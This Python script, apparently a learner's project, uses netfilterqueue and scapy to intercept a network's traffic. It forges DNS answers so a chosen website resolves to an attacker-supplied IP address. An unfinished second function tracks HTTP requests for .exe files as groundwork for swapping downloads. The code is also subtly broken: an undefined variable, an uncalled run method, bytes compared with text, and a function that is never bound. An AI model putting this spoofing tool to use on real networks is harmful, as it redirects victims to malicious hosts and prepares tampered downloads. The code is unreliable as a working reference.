#!/usr/bin/env python
#DNS spoofing project to intercept and alter packets
#Linux command: python DNS_spoofing.py
#Configure a DNS server on maching, modify IP address, or forward request/modify response.
#Find the A record --> rdata (raw data) for the specific website (qname)
#seq and ack reconciliation

import netfilterqueue
import scapy.all as scapy

ack_list = [] #file_override will add to the list
def process_packet(packet):
    hacked_packet = scapy.IP(packet.get_payload())
    if hacked_packet.haslayer(scapy.DNSRR):
        website_name = hacked_packet[scapy.DNSQR].qname
        if "www.website.com" in website_name.decode():
            answer = scapy.DNSRR(rrname=qname, rdata="NEW IP ADDRESS")
            hacked_packet[scapy.DNS].an = answer
            hacked_packet[scapy.DNS].ancount = 1
            del hacked_packet[scapy.IP].len
            del hacked_packet[scapy.IP].chksum
            del hacked_packet[scapy.UDP].len
            del hacked_packet[scapy.UDP].chksum

            packet.set_payload(bytes(hacked_packet))

        #print(hacked_packet.show()) #print first to visualize IP
        #Linux Command: ping -c 1 www.website.com --> IP of website.com
    packet.accept()

def file_override(packet):
    hacked_packet = scapy.IP(packet.get_payload())
    if hacked_packet.haslayer(scapy.Raw):
        # print(hacked_packet.show()) #print first to visualize RAW layer
        if hacked_packet[scapy.TCP].dport == 80: #request
            if ".exe" in hacked_packet[scapy.Raw].load:
                ack_list.append(hacked_packet[scapy.TCP].ack)
            #print(hacked_packet.show())
        elif hacked_packet[scapy.TCP].sport == 80:
            if hacked_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(hacked_packet[scapy.TCP].seq)
            #print(hacked_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run




